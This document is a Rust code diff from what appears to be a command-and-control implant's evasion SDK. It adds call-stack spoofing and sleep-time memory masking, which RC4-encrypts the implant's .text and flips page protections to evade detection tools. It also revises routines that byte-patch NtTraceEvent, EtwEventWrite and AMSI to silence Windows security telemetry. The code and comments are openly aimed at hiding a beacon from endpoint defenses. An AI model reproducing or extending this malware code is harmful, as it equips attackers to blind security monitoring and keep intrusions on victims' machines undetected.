@@ -15,7 +15,7 @@
 
 use crate::resolve;
 use nyx_implant_evasionsdk::gap;
-use nyx_implant_evasionsdk::{BlindKit, BlindTarget, EvasionError, GapPool, PdataGapScanner};
+use nyx_implant_evasionsdk::{BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit, PdataGapScanner, StackSpoofKit, SpoofGuard};
 
 /// Cap on how many 8-byte-aligned gap anchors we sample per inter-function /
 /// tail range. Keeps the `GapPool` bounded (a raw ntdll has ~3900 RUNTIME_
@@ -139,6 +139,41 @@ impl PdataGapScanner for LivePdataScanner {
     }
 }
 
+// ---- StackSpoofKit (P2.1a-ii) ----------------------------------------------
+//
+// Live BYOUD-Gap leaf-bridge chain staging + verification. The data path
+// (chain synthesis via `frame::build_leaf_bridge`) always runs so the chain
+// is verifiable via selftest. The actual RSP swap is gated behind
+// `stack::swap_enabled()` (default OFF) — see the module-level CET two-layer
+// note in stack.rs.
+
+/// Live call-stack spoof: stages BYOUD-Gap leaf-bridge chains and (when the
+/// CET-safe RSP swap is enabled) wraps sensitive calls in the spoofed scope.
+pub struct LiveStackSpoof;
+
+impl StackSpoofKit for LiveStackSpoof {
+    fn enter(&self, _gaps: &GapPool) -> Result<SpoofGuard, EvasionError> {
+        // Stage the chain (data path always runs for verification).
+        // spoof_wrap runs the staging even when the RSP swap is gated OFF.
+        // We call it with a no-op closure so the chain is staged into the
+        // global pool and verified (depth > 0, all slots non-zero) without
+        // actually wrapping any real syscall here.
+        unsafe {
+            crate::stack::spoof_wrap(|| {});
+        }
+        // Verify that a chain was actually staged (depth > 0).
+        let depth = crate::stack::last_staged_depth();
+        if depth == 0 {
+            // No gaps available → spoof unavailable → degrade.
+            return Ok(SpoofGuard::noop());
+        }
+        Ok(SpoofGuard::new(|| {
+            // Restore closure: currently a no-op because the RSP swap is gated.
+            // When the swap goes live, this will restore the original RSP.
+        }))
+    }
+}
+
 // ---- BlindKit (P2.1b) -----------------------------------------------------
 //
 // Routes the SDK `BlindTarget` enum to the live byte-patch primitives in
@@ -160,15 +195,15 @@ impl BlindKit for LiveBlind {
         let r = unsafe {
             match target {
                 BlindTarget::NtTraceEvent => {
-                    let r = crate::blind::patch_nt_trace_event();
-                    // Belt-and-suspenders: also disable the ETW-TI provider's
-                    // EnableInfo via NtTraceControl. Best-effort — if it fails,
-                    // the byte-patch is still in place. (No inner unsafe: we're
-                    // already inside the outer unsafe block at line 160.)
-                    let _ = crate::blind::disable_etw_provider(
-                        &nyx_implant_evasionsdk::__private::ETW_TI_GUID,
-                    );
-                    r
+                    // The NtTraceEvent byte-patch (xor eax,eax; ret) covers
+                    // the entire EtwEventWrite* family — one patch, all
+                    // providers silenced. We do NOT also call
+                    // disable_etw_provider() here: for kernel providers like
+                    // ETW-TI it always fails (STATUS_ACCESS_DENIED — the kernel
+                    // owns the provider's IsEnabled), and the failed syscall
+                    // generates unnecessary telemetry. The byte-patch alone is
+                    // sufficient and has less blast radius.
+                    crate::blind::patch_nt_trace_event()
                 }
                 BlindTarget::EtwEventWrite => crate::blind::patch_etw(),
                 BlindTarget::Amsi => crate::blind::patch_amsi(),
@@ -188,13 +223,54 @@ impl BlindKit for LiveBlind {
     }
 }
 
-/// Copy a `&'static str` error from blind.rs into an owned `String` for
-/// `EvasionError::Other`. blind.rs returns `&'static str` literals; we lift
+/// Copy a `&str` error from blind.rs into an owned `String` for
+/// `EvasionError::Other`. blind.rs returns `&str` literals; we lift
 /// them into the SDK's owned-string error variant.
 fn heap_str(s: &str) -> alloc::string::String {
     let mut out = alloc::string::String::new();
     out.push_str(s);
     out
+}
+
+// ---- MemoryMaskKit (P2.1d) ------------------------------------------------
+//
+// The content-encryption half of sleep obfuscation. Encrypts the implant
+// `.text` region (RC4 via the pure core) and flips RX→RW before sleep,
+// decrypts + flips back after sleep. Beats `EtwTI-FluctuationMonitor`
+// (content encryption) and Fluctuation (page-protection flip).
+//
+// ## Usage contract
+// `mask()` must be called while the thread is NOT executing from `.text` —
+// i.e. inside a Foliage APC chain where a helper thread runs the encrypt
+// while the beacon thread is parked. The beacon loop calls `mask()`/
+// `unmask()` only through the `SleepmaskKit` seam, never synchronously.
+
+/// Live memory-content mask: encrypt the implant `.text` via RC4 and
+/// flip RX→RW, restoring on `unmask`. Delegates to `crate::mem::{mask_text,
+/// unmask_text}` for the actual VirtualProtect + RC4 operations, and to
+/// `crate::sleep::own_text_region()` for the PE-resolved `.text` base+len.
+pub struct LiveMemoryMask;
+
+impl MemoryMaskKit for LiveMemoryMask {
+    fn mask(&self) -> Result<MaskToken, EvasionError> {
+        let region = unsafe { crate::sleep::own_text_region() }
+            .ok_or(EvasionError::Unresolved(".text region"))?;
+        let key = crate::mem::mask_key();
+        // Flip RX→RW then RC4-encrypt. SAFETY: caller guarantees we're in the
+        // Foliage helper context — the beacon thread is parked in alertable
+        // sleep, NOT executing .text.
+        unsafe { crate::mem::mask_text(region.base, region.len, &key); }
+        Ok(MaskToken::new(region.base, region.len, key))
+    }
+
+    fn unmask(&self, token: MaskToken) -> Result<(), EvasionError> {
+        // Decrypt then flip RW→RX. SAFETY: must run before any code in .text
+        // executes (the Foliage helper unmasks before the beacon wakes).
+        unsafe {
+            crate::mem::unmask_text(token.base, token.len, &token.key);
+        }
+        Ok(())
+    }
 }
 
 // ---- ProcessInjectKit (P2.1c) --------------------------------------------
